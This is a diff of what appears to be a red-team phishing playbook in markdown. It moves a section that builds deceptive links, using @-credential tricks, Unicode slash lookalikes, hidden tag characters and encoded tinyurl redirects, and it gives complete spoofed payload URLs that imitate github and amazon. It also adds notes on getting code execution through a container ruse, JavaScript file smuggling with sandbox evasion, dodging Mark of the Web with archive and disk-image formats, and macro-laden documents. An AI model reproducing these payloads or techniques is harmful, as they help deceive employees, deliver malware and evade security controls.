@@ -145,42 +145,14 @@ This confirmation is required so we can retain licenses only for employees who a
   - "Hi! I'm a student interested in working here..."
   - "Hi! My account isn't working, I don't know why. Can we meet..."
 
-## Spoofing any site in a link
+## Getting Code Execution
 
-- Often, this isn't actually necessary, as we can just make a pretty email that has a button to click. 
-
-**Techniques**
-- Uses `@` character to tell the browser that everything before the `@` is simply authentication for the following page (an encoded tinyurl site) - I didn't find an arbitrary redirect on github
-	- You can't use the `@` technique after a domain AND path have been specified, so specify fake paths using a `/` Unicode lookalike: `∕` (effectively making the TLD in the domain very very long)
-	- This lookalike character is a unicode division slash without any numbers (think ⅓)
-- You can actually URL encode every single character in a link except for the `/`, so the entire tinyurl link is encoded
-- `&` can actually be included without encoding in the authentication information (prior to the `@`), so I included bogus URL parameters from an amazon product link to make it look more realistic (hiding the URL encoded link within)
-- For google meets, a link starting with a valid URL (e.g. https://github.com) will be underlined, so I included some hidden unicode characters to break the link
-
-**Example**
-- `https://` - start of URL
-- `U+E0001 U+E0020 U+E007F` - hidden Unicode characters to break link underlining functionality in Google meets
-- Used https://embracethered.com/blog/ascii-smuggler.html to encode ` `
-- `󠁿github.com` - normal github domain
-- `∕praetorian-inc∕Cerebrum∕tree∕main∕Personal%20Spaces∕khael.kugler` - realistic path using fake `∕` character
-- `&diff=%75%6E%69%66%69%65%64&uuid=259d9f6c-ea4f-492b-a741-8ca016e53a70&ref=main_1598392` - fake URL parameters used to hide the actual payload
-- `@%74%69%6E%79%75%72%6C%2E%63%6F%6D/%33%39%74%7A%72%6A%79%6A` - payload decoding to `tinyurl.com/39tzrjyj`, starting with `@`
-- `#&whitespace=ignore&inline=false&workflow=ci-deploy-container-ghcr-ref-main` - more fake parameters, starting with a `#` to not confuse tinyurl's redirection
-
-- When emailing, choose a font that looks good. Menlo is alright, but a bit too code-related
-
-Final payload: `https://󠀁󠀠󠁿github.com∕praetorian-inc∕Cerebrum∕tree∕main∕Personal%20Spaces∕khael.kugler&diff=%75%6E%69%66%69%65%64&uuid=259d9f6c-ea4f-492b-a741-8ca016e53a70&ref=main_1598392@%74%69%6E%79%75%72%6C%2E%63%6F%6D/%33%39%74%7A%72%6A%79%6A#&whitespace=ignore&inline=false&workflow=ci-deploy-container-ghcr-ref-main`
-
-Other example payloads:
-`https://github.com∕praetorian-inc∕noseyparker∕releases∕download∕v0.23.0∕secret-noseyparker-v0.23.0-aarch64-apple-darwin.tar.gz&conplccinc=259d9f6c-ea4f-492b-a741-8ca016e53a70ts=abthh8sjiwjcbgqcpkynoq55p8khgag&dasin=B07774L6@%74%69%6E%79%75%72%6C%2E%63%6F%6D/%79%63%38%78%61%66%74%32/&96298722-d186-4e28-b5e9-2ca14f49d977=1`
-
-`https://www.amazon.com∕gp∕product∕B008A0GNA8pr=conplccinc=259d9f6c-ea4f-492b-a741-8ca016e53a70ts=abthh8sjiwjcbgqcpkynoq55p8khgag&dasin=B07774L6TT&plattr=mathplace=priceblockimp@%74%69%6E%79%75%72%6C%2E%63%6F%6D/%79%63%38%78%61%66%74%32?=96298722-d186-4e28-b5e9-2ca14f49d977`
-
-- Can also sort of be used to bypass URL validation
-  - Portswigger URL bypass techniques: https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
-
-## File Downloading Techniques
-
+**Containerized setup**
+- Keep in mind that one of the main goals of compromising an employee device is internal network access
+- This can be  achievable no matter where we're executing, which include inside of something like a docker container or VM
+- A proper ruse to get them to install a container (like an interview exercise or something) could land non-EDR execution with the ability to probe the internal network
+- If we're targeting SAAS creds, however, this won't do us much good
+  
 **File Smuggling - thanks to Print3M**
 - Rather than getting a user to download a file from a server, simply store the entire file in JavaScript
 - This has two bonuses: the file doesn't need to be fetched from a server, and it also doesn't generate any network logs
@@ -208,6 +180,9 @@ function downloadFile() {
 }
 ```
 
+**Avoiding MOTW**
+- Can avoid motw by putting malware inside 7zip, ISO, IMG
+
 **Sandbox Detection - thanks to Print3M**
 - Execute JavaScript - most scanners still won't run JavaScript! Using React actually gives us this OPSEC measure out-of-the-box.
 - Timeout - wait a second before smuggling malware. The victim probably won't click any faster anyway. If the sandbox is waiting for the page to render, a second's wait is already likely to discourage it.
@@ -216,11 +191,6 @@ function downloadFile() {
 - User Agent - bots often have an unusual User Agent that does not match real browsers.
 - Trap buttons - add hidden trap buttons that only the bot clicks. This way we will recognize if a bot is walking around the site.
 - Bad HTML practices - using bad HTML practices can naturally obscure the meaning of our code. E.g. using a div element with an onclick action instead of the classic button element can cause the sandbox to not click it.
-
-**Abuse Example**
-- Trick a user to go to a link
-- Provide a button that downloads a docx file, directly from Javascript
-- Have macros embedded in the blurry file, GG
 
 ## Vishing
 
@@ -236,7 +206,6 @@ function downloadFile() {
 ## Windows 
 - Can't send malware directly by email, so we need to get them to download the spreadsheet with macros from a link
   - Also need to "blur" the spreadsheet so victim clicks "Enable Editing" to allow macros
-  - Avoid Mark of the Web (MOTW) by putting malware inside 7zip, ISO, IMG
 - Windows library files are less well-known and can be equally effective for hosting files
 - Executing `.Library-ms` file into executing `.lnk` file
 - These files display remote directories like local directories, where we put .lnk file
@@ -293,3 +262,37 @@ Sub MyMacro()
 
 End Sub
 ```
+
+## Spoofing any site in a link
+
+- Often, this isn't actually necessary, as we can just make a pretty email that has a button to click. 
+
+**Techniques**
+- Uses `@` character to tell the browser that everything before the `@` is simply authentication for the following page (an encoded tinyurl site) - I didn't find an arbitrary redirect on github
+	- You can't use the `@` technique after a domain AND path have been specified, so specify fake paths using a `/` Unicode lookalike: `∕` (effectively making the TLD in the domain very very long)
+	- This lookalike character is a unicode division slash without any numbers (think ⅓)
+- You can actually URL encode every single character in a link except for the `/`, so the entire tinyurl link is encoded
+- `&` can actually be included without encoding in the authentication information (prior to the `@`), so I included bogus URL parameters from an amazon product link to make it look more realistic (hiding the URL encoded link within)
+- For google meets, a link starting with a valid URL (e.g. https://github.com) will be underlined, so I included some hidden unicode characters to break the link
+
+**Example**
+- `https://` - start of URL
+- `U+E0001 U+E0020 U+E007F` - hidden Unicode characters to break link underlining functionality in Google meets
+- Used https://embracethered.com/blog/ascii-smuggler.html to encode ` `
+- `󠁿github.com` - normal github domain
+- `∕praetorian-inc∕Cerebrum∕tree∕main∕Personal%20Spaces∕khael.kugler` - realistic path using fake `∕` character
+- `&diff=%75%6E%69%66%69%65%64&uuid=259d9f6c-ea4f-492b-a741-8ca016e53a70&ref=main_1598392` - fake URL parameters used to hide the actual payload
+- `@%74%69%6E%79%75%72%6C%2E%63%6F%6D/%33%39%74%7A%72%6A%79%6A` - payload decoding to `tinyurl.com/39tzrjyj`, starting with `@`
+- `#&whitespace=ignore&inline=false&workflow=ci-deploy-container-ghcr-ref-main` - more fake parameters, starting with a `#` to not confuse tinyurl's redirection
+
+- When emailing, choose a font that looks good. Menlo is alright, but a bit too code-related
+
+Final payload: `https://󠀁󠀠󠁿github.com∕praetorian-inc∕Cerebrum∕tree∕main∕Personal%20Spaces∕khael.kugler&diff=%75%6E%69%66%69%65%64&uuid=259d9f6c-ea4f-492b-a741-8ca016e53a70&ref=main_1598392@%74%69%6E%79%75%72%6C%2E%63%6F%6D/%33%39%74%7A%72%6A%79%6A#&whitespace=ignore&inline=false&workflow=ci-deploy-container-ghcr-ref-main`
+
+Other example payloads:
+`https://github.com∕praetorian-inc∕noseyparker∕releases∕download∕v0.23.0∕secret-noseyparker-v0.23.0-aarch64-apple-darwin.tar.gz&conplccinc=259d9f6c-ea4f-492b-a741-8ca016e53a70ts=abthh8sjiwjcbgqcpkynoq55p8khgag&dasin=B07774L6@%74%69%6E%79%75%72%6C%2E%63%6F%6D/%79%63%38%78%61%66%74%32/&96298722-d186-4e28-b5e9-2ca14f49d977=1`
+
+`https://www.amazon.com∕gp∕product∕B008A0GNA8pr=conplccinc=259d9f6c-ea4f-492b-a741-8ca016e53a70ts=abthh8sjiwjcbgqcpkynoq55p8khgag&dasin=B07774L6TT&plattr=mathplace=priceblockimp@%74%69%6E%79%75%72%6C%2E%63%6F%6D/%79%63%38%78%61%66%74%32?=96298722-d186-4e28-b5e9-2ca14f49d977`
+
+- Can also sort of be used to bypass URL validation
+  - Portswigger URL bypass techniques: https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
